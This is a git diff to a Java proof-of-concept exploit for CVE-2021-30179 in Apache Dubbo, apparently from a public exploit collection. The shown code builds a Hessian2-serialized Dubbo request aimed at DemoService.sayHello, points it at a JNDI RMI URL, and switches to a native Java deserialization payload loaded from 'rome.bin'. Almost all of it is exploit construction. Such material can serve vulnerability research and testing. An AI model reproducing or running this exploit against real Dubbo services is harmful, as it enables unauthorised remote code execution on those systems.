@@ -11,9 +11,9 @@ import java.util.HashMap;
 
 /**
  * @author Whoopsunix
- *
+ * <p>
  * CVE-2021-30179
- *
+ * <p>
  * 2.5.x、[2.6.0, 2.6.8]、[2.7.0, 2.7.9]
  */
 public class CVE_2021_30179 {
@@ -37,7 +37,7 @@ public class CVE_2021_30179 {
         Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
 
         // 1.dubboVersion
-        out.writeUTF("2.7.6");
+        out.writeUTF("2.7.5");
         // 2.path
         out.writeUTF("org.example.api.DemoService");
         // 3.version
@@ -50,9 +50,10 @@ public class CVE_2021_30179 {
         out.writeUTF("sayHello");
         out.writeObject(new String[]{"java.lang.String"});
 
-        String url = "rmi://127.0.0.1:1099/uljii0";
+        String url = "rmi://127.0.0.1:1099/tn3x0r";
 //        bean(out, url);
-        rawReturn(out,url);
+//        rawReturn(out, url);
+        nativeJava(out, "rome.bin");
 
         out.flushBuffer();
 
